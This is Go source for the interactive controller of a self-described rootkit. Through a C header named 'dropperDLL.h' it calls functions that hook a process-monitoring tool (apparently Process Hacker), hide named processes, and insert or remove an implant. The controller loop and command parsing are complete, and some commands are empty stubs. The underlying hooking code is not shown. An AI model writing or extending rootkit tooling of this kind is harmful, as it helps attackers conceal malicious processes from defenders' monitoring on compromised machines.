package main

import (
	"bufio"
	"os"
	"strings"
	"unsafe"
)

//#include "dropperDLL.h"
import "C"

func getAction() (exitCode int8) {
	exitCode = 1

	stdIn := bufio.NewReader(os.Stdin)
	help := "Help page\n"

	os.Stdout.WriteString("Rootkit> ")

	input, _ := stdIn.ReadString('\n')
	input = strings.TrimSuffix(input, "\r\n")
	inputParams := strings.Split(input, " ")

	if len(inputParams) == 1 {
		if inputParams[0] == "help" {
			os.Stdout.WriteString(help)
		} else if inputParams[0] == "exit" {
			os.Stdout.WriteString("Bye bye\n")

			C.remove_ph_implant()

			exitCode = 0
		} else {
			os.Stdout.WriteString(help)
		}
	} else if len(inputParams) == 2 {
		if inputParams[0] == "hook" {
			if inputParams[1] == "ph" {
				C.hook_ph()
			}
		} else if inputParams[0] == "unhook" {
			if inputParams[1] == "ph" {
				C.unhook_ph()
			}
		}
	} else if len(inputParams) == 3 {
		if inputParams[0] == "hide" {
			if inputParams[1] == "process" {
				cProcName := C.CString(inputParams[2])
				C.hide_process(cProcName)
				C.free(unsafe.Pointer(cProcName))
			} else if inputParams[1] == "key" {

			} else {
				os.Stdout.WriteString(help)
			}
		} else if inputParams[0] == "show" {

		} else if inputParams[0] == "insert" && inputParams[1] == "implant" {
			if inputParams[2] == "ph" {
				C.insert_ph_implant()
			}
		} else if inputParams[0] == "remove" && inputParams[1] == "implant" {
			if inputParams[2] == "ph" {
				C.remove_ph_implant()
			}
		} else {
			os.Stdout.WriteString(help)
		}
	}

	return
}

func main() {
	for getAction() != 0 {

	}
}
